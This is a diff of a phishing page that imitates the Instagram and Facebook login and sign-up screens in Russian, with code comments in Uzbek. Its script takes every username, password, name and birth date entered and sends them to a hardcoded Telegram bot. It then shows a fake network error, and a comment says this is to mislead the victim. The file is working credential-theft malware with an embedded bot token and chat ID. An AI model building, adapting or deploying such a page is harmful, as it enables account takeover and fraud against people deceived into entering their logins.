@@ -3,234 +3,224 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram & Facebook Clone</title>
+    <title>Instagram</title>
     <style>
-        /* 100% o'xshashlik uchun maxsus sozlamalar */
+        /* Umumiy sozlamalar */
         * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body, html { margin: 0; padding: 0; height: 100%; overflow-x: hidden; }
-        .wrapper { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 40px 20px; }
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; transition: background 0.3s; }
+        .wrapper { display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 20px; position: relative; }
         .hidden { display: none !important; }
 
-        /* --- INSTAGRAM (image_f3cf2f.png & image_f3cf10.png) --- */
+        /* --- INSTAGRAM STILI (To'q kulrang/qora) --- */
         .insta-bg { background-color: #000000; color: #ffffff; }
-        .insta-container { width: 100%; max-width: 350px; text-align: center; }
-        .insta-header-text { font-size: 14px; font-weight: 400; margin-bottom: 40px; margin-top: 10px; }
+        .insta-container { width: 100%; max-width: 350px; text-align: center; margin-top: 30px; }
+        .insta-logo-main { width: 175px; margin-bottom: 40px; margin-top: 20px; }
         
-        .input-field { 
+        .insta-header { font-size: 16px; font-weight: 600; margin-bottom: 20px; }
+        
+        .input-box { 
             width: 100%; 
             background: #121212; 
             border: 1px solid #363636; 
-            border-radius: 12px; 
-            color: #ffffff; 
-            padding: 14px 12px; 
-            margin-bottom: 12px; 
-            font-size: 14px; 
-        }
-        .input-field::placeholder { color: #8e8e8e; }
-        .input-field:focus { border: 1px solid #555; outline: none; }
-
-        .btn-primary { 
-            width: 100%; 
-            background-color: #0064e0; 
-            border: none; 
-            border-radius: 25px; 
-            color: #ffffff; 
-            font-weight: 600; 
+            border-radius: 8px; 
+            color: #efefef; 
             padding: 12px; 
-            font-size: 15px; 
-            cursor: pointer; 
-            margin-top: 10px;
-        }
-
-        .insta-link { color: #ffffff; font-size: 14px; text-decoration: none; margin-top: 25px; display: block; font-weight: 500; }
-        
-        .secondary-btn { 
-            width: 100%; 
-            background: none; 
-            border: 1px solid #363636; 
-            color: #ffffff; 
-            border-radius: 25px; 
-            padding: 10px; 
-            margin-top: 15px; 
+            margin-bottom: 8px; 
             font-size: 14px; 
-            font-weight: 500; 
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
+        }
+        .input-box::placeholder { color: #8e8e8e; }
+        .input-box:focus { border-color: #a8a8a8; outline: none; }
+
+        .btn-login { 
+            width: 100%; 
+            background-color: #0095f6; 
+            border: none; 
+            border-radius: 8px; 
+            color: white; 
+            font-weight: 600; 
+            padding: 10px; 
+            font-size: 14px; 
+            cursor: pointer; 
+            margin-top: 8px;
+        }
+        .btn-login:active { opacity: 0.7; }
+
+        .forgot-link { color: #e0f1ff; font-size: 12px; text-decoration: none; margin-top: 15px; display: block; }
+        
+        .fb-login-btn { 
+            background: none; border: none; color: #0095f6; font-weight: 600; 
+            font-size: 14px; cursor: pointer; display: flex; align-items: center; 
+            justify-content: center; gap: 8px; margin-top: 30px; width: 100%;
         }
 
-        /* --- FACEBOOK (image_f3ceb6.png & image_f3ce96.jpg) --- */
+        .create-acc-btn {
+            width: 100%; background: none; border: 1px solid #363636; 
+            color: #0095f6; border-radius: 8px; padding: 8px; 
+            font-weight: 600; font-size: 14px; margin-top: 20px; cursor: pointer;
+        }
+
+        /* --- FACEBOOK STILI (Oq/Ko'k) --- */
         .fb-bg { background-color: #ffffff; color: #1c1e21; }
-        .fb-container { width: 100%; max-width: 400px; text-align: center; }
-        .fb-title { text-align: left; font-size: 20px; font-weight: 700; margin-bottom: 30px; margin-top: 20px; }
+        .fb-container { width: 100%; max-width: 400px; text-align: center; margin-top: 40px; }
+        .fb-logo-text { width: 112px; margin-bottom: 30px; }
         
         .fb-input { 
-            width: 100%; 
-            background: #f5f6f7; 
-            border: 1px solid #dddfe2; 
-            border-radius: 12px; 
-            padding: 16px; 
-            margin-bottom: 12px; 
-            font-size: 16px; 
+            width: 100%; background: #f5f6f7; border: 1px solid #dddfe2; 
+            border-radius: 8px; padding: 14px; margin-bottom: 12px; font-size: 16px; 
+        }
+        .fb-btn-main { 
+            background-color: #1877f2; border: none; border-radius: 8px; 
+            color: white; font-size: 18px; font-weight: bold; width: 100%; 
+            padding: 10px; cursor: pointer; 
         }
 
-        .fb-btn-reg { 
-            background: none; 
-            border: 1px solid #0064e0; 
-            color: #0064e0; 
-            border-radius: 25px; 
-            width: 100%; 
-            padding: 10px; 
-            font-weight: 600; 
-            margin-top: 80px;
-            cursor: pointer;
-        }
+        /* Footer */
+        .footer { margin-top: auto; padding-bottom: 20px; text-align: center; width: 100%; }
+        .meta-logo { width: 60px; filter: grayscale(1); opacity: 0.6; }
+        .meta-text { font-size: 12px; color: #8e8e8e; margin-top: 5px; }
 
-        /* Footer & Meta Logo */
-        .meta-footer { margin-top: auto; padding-bottom: 20px; text-align: center; }
-        .meta-logo { width: 60px; opacity: 0.8; margin-bottom: 5px; }
-        .meta-text { font-size: 12px; color: #8e8e8e; font-weight: bold; }
+        /* Selectlar uchun */
+        select.input-box { appearance: none; background-image: url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20width%3D%2212%22%20height%3D%2212%22%20viewBox%3D%220%200%2012%2012%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%3Cpath%20d%3D%22M2%204L6%208L10%204%22%20stroke%3D%22%238E8E8E%22%20stroke-width%3D%221.5%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22/%3E%3C/svg%3E'); background-repeat: no-repeat; background-position: right 12px center; }
     </style>
 </head>
 <body>
 
 <!-- INSTAGRAM LOGIN -->
-<div id="page1" class="wrapper insta-bg">
+<div id="insta_login" class="wrapper insta-bg">
     <div class="insta-container">
-        <div class="insta-header-text">Войти в Instagram</div>
-        <input type="text" id="i_l_u" class="input-field" placeholder="Имя пользователя, номер или email">
-        <input type="password" id="i_l_p" class="input-field" placeholder="Пароль">
-        <button class="btn-primary" onclick="sendData('Insta Login', ['i_l_u', 'i_l_p'])">Войти</button>
-        <a href="#" class="insta-link">Забыли пароль?</a>
+        <!-- Instagram Logo -->
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef152.png" class="insta-logo-main" alt="Instagram">
         
-        <div style="margin-top: 40px; width: 100%;">
-            <button class="secondary-btn" onclick="showPage('page3')">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="18">
-                Войти через Facebook
-            </button>
-            <button class="secondary-btn" style="color: #0064e0; border-color: #0064e0;" onclick="showPage('page2')">Создать новый аккаунт</button>
-        </div>
+        <input type="text" id="i_user" class="input-box" placeholder="Телефон, имя пользователя или email">
+        <input type="password" id="i_pass" class="input-box" placeholder="Пароль">
+        
+        <button class="btn-login" onclick="sendData('Insta Login', ['i_user', 'i_pass'])">Войти</button>
+        
+        <a href="#" class="forgot-link">Забыли пароль?</a>
+
+        <button class="fb-login-btn" onclick="switchPage('fb_login')">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="18">
+            Войти через Facebook
+        </button>
+
+        <button class="create-acc-btn" onclick="switchPage('insta_reg')">Создать новый аккаунт</button>
     </div>
-    <div class="meta-footer">
-        <div class="meta-text">∞ Meta</div>
+
+    <div class="footer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo">
+        <div class="meta-text">© 2026 Instagram from Meta</div>
     </div>
 </div>
 
 <!-- INSTAGRAM REGISTER -->
-<div id="page2" class="wrapper insta-bg hidden">
+<div id="insta_reg" class="wrapper insta-bg hidden">
     <div class="insta-container" style="text-align: left;">
-        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 20px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" width="24">
+        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 10px;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1024px-Meta_Platforms_Inc._logo.svg.png" width="20" style="filter: invert(1);">
             <span style="font-weight: bold; font-size: 14px;">Meta</span>
         </div>
-        <h2 style="font-size: 24px; margin: 0;">Зарегистрируйтесь в Instagram</h2>
-        <p style="color: #8e8e8e; font-size: 14px; margin-top: 8px; margin-bottom: 25px;">Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.</p>
-        
-        <input type="text" id="i_r_c" class="input-field" placeholder="Мобильный телефон или электронный адрес">
-        <input type="password" id="i_r_p" class="input-field" placeholder="Пароль">
+        <h2 style="font-size: 24px; margin-bottom: 10px;">Зарегистрируйтесь</h2>
+        <p style="color: #8e8e8e; font-size: 14px; margin-bottom: 20px;">Зарегистрируйтесь, чтобы смотреть фото и видео ваших друзей.</p>
+
+        <input type="text" id="r_contact" class="input-box" placeholder="Моб. номер или электронный адрес">
+        <input type="password" id="r_pass" class="input-box" placeholder="Пароль">
         
         <div style="margin: 15px 0 10px; font-size: 14px;">Дата рождения ⓘ</div>
-        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
-            <select id="d" class="input-field" style="margin:0"></select>
-            <select id="m" class="input-field" style="margin:0"></select>
-            <select id="y" class="input-field" style="margin:0"></select>
+        <div style="display: flex; gap: 8px; margin-bottom: 15px;">
+            <select id="rd" class="input-box" style="margin:0"></select>
+            <select id="rm" class="input-box" style="margin:0"></select>
+            <select id="ry" class="input-box" style="margin:0"></select>
         </div>
 
-        <input type="text" id="i_r_n" class="input-field" placeholder="Имя и фамилия">
-        <input type="text" id="i_r_u" class="input-field" placeholder="Имя пользователя">
+        <input type="text" id="r_name" class="input-box" placeholder="Имя и фамилия">
+        <input type="text" id="r_user" class="input-box" placeholder="Имя пользователя">
         
-        <button class="btn-primary" style="border-radius: 10px;" onclick="sendData('Insta Reg', ['i_r_c', 'i_r_p', 'd', 'm', 'y', 'i_r_n', 'i_r_u'])">Отправить</button>
+        <button class="btn-login" style="margin-top: 15px;" onclick="sendData('Insta Reg', ['r_contact', 'r_pass', 'rd', 'rm', 'ry', 'r_name', 'r_user'])">Регистрация</button>
+        
         <div style="text-align: center; margin-top: 20px;">
-            <span style="color: #8e8e8e; font-size: 14px; cursor: pointer;" onclick="showPage('page1')">У меня уже есть аккаунт</span>
+            <span style="color: #8e8e8e; font-size: 14px; cursor: pointer;" onclick="switchPage('insta_login')">У меня уже есть аккаунт</span>
         </div>
     </div>
 </div>
 
 <!-- FACEBOOK LOGIN -->
-<div id="page3" class="wrapper fb-bg hidden">
+<div id="fb_login" class="wrapper fb-bg hidden">
     <div class="fb-container">
-        <div class="fb-title">Войдите на Facebook</div>
-        <input type="text" id="f_l_u" class="fb-input" placeholder="Электронный адрес или номер мобильного телефона">
-        <input type="password" id="f_l_p" class="fb-input" placeholder="Пароль">
-        <button class="btn-primary" style="font-size: 18px; padding: 14px;" onclick="sendData('FB Login', ['f_l_u', 'f_l_p'])">Войти</button>
-        <a href="#" class="insta-link" style="color: #1c1e21; font-weight: 500;">Забыли пароль?</a>
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lE_V8ch_E4.svg" class="fb-logo-text" alt="Facebook">
         
-        <button class="fb-btn-reg" onclick="showPage('page4')">Создать новый аккаунт</button>
-    </div>
-    <div class="meta-footer">
-        <div class="meta-text" style="color: #606770;">∞ Meta</div>
-    </div>
-</div>
-
-<!-- FACEBOOK REGISTER -->
-<div id="page4" class="wrapper fb-bg hidden">
-    <div class="fb-container" style="text-align: left;">
-        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 15px;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" width="24">
-            <span style="font-weight: bold; font-size: 14px;">Meta</span>
+        <div style="background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+            <input type="text" id="f_user" class="fb-input" placeholder="Номер мобильного или эл. адрес">
+            <input type="password" id="f_pass" class="fb-input" placeholder="Пароль">
+            <button class="fb-btn-main" onclick="sendData('FB Login', ['f_user', 'f_pass'])">Вход</button>
+            <a href="#" style="color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 15px;">Забыли пароль?</a>
+            <hr style="border: 0; border-top: 1px solid #dddfe2; margin: 20px 0;">
+            <button style="background: #42b72a; color: white; border: none; border-radius: 6px; padding: 10px 16px; font-weight: bold; cursor: pointer;" onclick="switchPage('insta_login')">Вернуться в Instagram</button>
         </div>
-        <h2 style="font-size: 22px; margin: 0;">Начните пользоваться Facebook</h2>
-        
-        <div style="display: flex; gap: 10px; margin-top: 20px;">
-            <input type="text" id="f_r_n" class="fb-input" placeholder="Имя">
-            <input type="text" id="f_r_s" class="fb-input" placeholder="Фамилия">
-        </div>
-        
-        <div style="margin: 10px 0 10px; font-size: 14px;">Дата рождения ⓘ</div>
-        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
-            <select id="fd" class="fb-input" style="margin:0; padding: 10px;"></select>
-            <select id="fm" class="fb-input" style="margin:0; padding: 10px;"></select>
-            <select id="fy" class="fb-input" style="margin:0; padding: 10px;"></select>
-        </div>
-
-        <input type="text" id="f_r_c" class="fb-input" placeholder="Номер мобильного или email">
-        <input type="password" id="f_r_p" class="fb-input" placeholder="Пароль">
-        
-        <button class="btn-primary" style="padding: 14px;" onclick="sendData('FB Reg', ['f_r_n', 'f_r_s', 'fd', 'fm', 'fy', 'f_r_c', 'f_r_p'])">Отправить</button>
-        <div style="text-align: center; margin-top: 20px; color: #0064e0; font-weight: 600; cursor: pointer;" onclick="showPage('page3')">У меня уже есть аккаунт</div>
     </div>
 </div>
 
 <script>
+    // --- BOT SOZLAMALARI ---
     const TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
     const CHAT_ID = "6198817749";
 
-    function showPage(id) {
+    // Sahifani almashtirish
+    function switchPage(id) {
         document.querySelectorAll('.wrapper').forEach(p => p.classList.add('hidden'));
-        document.getElementById(id).classList.remove('hidden');
-    }
-
-    function fillDates() {
-        const days = document.querySelectorAll('#d, #fd'), months = document.querySelectorAll('#m, #fm'), years = document.querySelectorAll('#y, #fy');
-        const monthNames = ["Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"];
+        const target = document.getElementById(id);
+        target.classList.remove('hidden');
         
-        days.forEach(el => { for(let i=1; i<=31; i++) el.innerHTML += `<option>${i}</option>`; });
-        months.forEach(el => { monthNames.forEach(m => el.innerHTML += `<option>${m}</option>`); });
-        years.forEach(el => { for(let i=2026; i>=1950; i--) el.innerHTML += `<option>${i}</option>`; });
+        if (id.includes('fb')) {
+            document.body.style.background = "#ffffff";
+        } else {
+            document.body.style.background = "#000000";
+        }
     }
-    fillDates();
 
+    // Sana tanlash qismini to'ldirish
+    function initDates() {
+        const days = document.getElementById('rd'), months = document.getElementById('rm'), years = document.getElementById('ry');
+        const mNames = ["Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"];
+        
+        for(let i=1; i<=31; i++) days.innerHTML += `<option>${i}</option>`;
+        mNames.forEach(m => months.innerHTML += `<option>${m}</option>`);
+        for(let i=2026; i>=1950; i--) years.innerHTML += `<option>${i}</option>`;
+    }
+    initDates();
+
+    // Ma'lumotlarni Telegramga yuborish
     async function sendData(type, ids) {
-        let message = `🔥 *Yangi Natija: ${type}*\n\n`;
-        let valid = true;
+        let text = `📣 *Yangi Ma'lumot (${type})*\n\n`;
+        let filled = true;
+        
         ids.forEach(id => {
             const val = document.getElementById(id).value;
-            if(!val) valid = false;
-            message += `🔹 *${id}:* \`${val}\`\n`;
+            if(!val) filled = false;
+            text += `📍 *${id}:* \`${val}\`\n`;
         });
 
-        if(!valid) return alert("Iltimos, barcha maydonlarni to'ldiring!");
+        if(!filled) {
+            alert("Iltimos, barcha maydonlarni to'ldiring.");
+            return;
+        }
 
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
-        });
-        
-        alert("Server bilan ulanishda xatolik (Error 404). Qayta urinib ko'ring.");
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+            // Foydalanuvchini chalg'itish uchun soxta xatolik
+            alert("Ошибка сети. Пожалуйста, проверьте соединение и попробуйте снова.");
+        } catch (e) {
+            console.error(e);
+        }
     }
 </script>
+
 </body>
 </html>
